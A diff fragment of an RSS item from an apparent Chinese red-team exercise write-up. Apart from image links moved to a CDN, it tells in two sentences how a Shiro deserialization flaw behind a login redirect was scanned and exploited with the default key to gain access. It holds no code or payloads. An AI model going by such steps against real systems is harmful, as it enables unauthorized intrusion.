+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-ac0b3d70b98d7dd50bfe09bcff238f0ed23089df.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-ac0b3d70b98d7dd50bfe09bcff238f0ed23089df.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-ac0b3d70b98d7dd50bfe09bcff238f0ed23089df.png">
         
     </a></p>
 <h2 id="33shiro" class="headerLink">
     <a href="#33shiro" class="header-mark"></a>3.3、shiro</h2><p>目标路径在被访问时，会先跳转到统一认证登录，导致大部分都忽视了该路径是存在shiro反序列化漏洞的</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-f81143a6217ca648a5848eb99aea082c598fb2f5.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-f81143a6217ca648a5848eb99aea082c598fb2f5.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-f81143a6217ca648a5848eb99aea082c598fb2f5.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-f81143a6217ca648a5848eb99aea082c598fb2f5.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-f81143a6217ca648a5848eb99aea082c598fb2f5.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-f81143a6217ca648a5848eb99aea082c598fb2f5.png">
         
     </a></p>
 <p>本着试一试的心态进行了shiro的扫描，默认密钥，直接获取权限</p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-acd9d83416103fc5d4c208d3b705b28c5a15c09a.png" title="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-acd9d83416103fc5d4c208d3b705b28c5a15c09a.png" data-thumbnail="https://www.bysec.cn/OSS/img/攻防实战外网突破/attach-acd9d83416103fc5d4c208d3b705b28c5a15c09a.png">
+<p><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/%e6%94%bb%e9%98%b2%e5%ae%9e%e6%88%98%e5%a4%96%e7%bd%91%e7%aa%81%e7%a0%b4/attach-acd9d83416103fc5d4c208d3b705b28c5a15c09a.png" title="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-acd9d83416103fc5d4c208d3b705b28c5a15c09a.png" data-thumbnail="https://cdn.jsdelivr.net/gh/cnbysec/cnbysec.github.io/OSS/img/攻防实战外网突破/attach-acd9d83416103fc5d4c208d3b705b28c5a15c09a.png">
         
     </a></p>]]></description>
 </item></channel>
